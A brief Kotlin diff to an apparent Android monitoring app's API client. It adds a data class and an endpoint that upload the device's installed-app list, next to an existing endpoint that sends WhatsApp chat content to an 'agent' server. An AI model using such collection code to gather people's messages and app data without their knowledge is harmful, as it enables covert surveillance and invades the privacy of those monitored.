@@ -44,6 +44,14 @@ data class WhatsAppChatPayload(
     val timestamp: Long
 )
 
+data class InstalledAppEntry(
+    val packageName: String,
+    val appName: String,
+    val version: String,
+    val installedAt: Long,
+    val iconBase64: String?
+)
+
 // ---------- Service ----------
 
 interface ApiService {
@@ -62,4 +70,7 @@ interface ApiService {
 
     @POST("agent/whatsapp/chat")
     suspend fun sendWhatsAppChat(@Body payload: WhatsAppChatPayload): Response<Unit>
+
+    @POST("agent/apps")
+    suspend fun sendInstalledApps(@Body entries: List<InstalledAppEntry>): Response<Unit>
 }
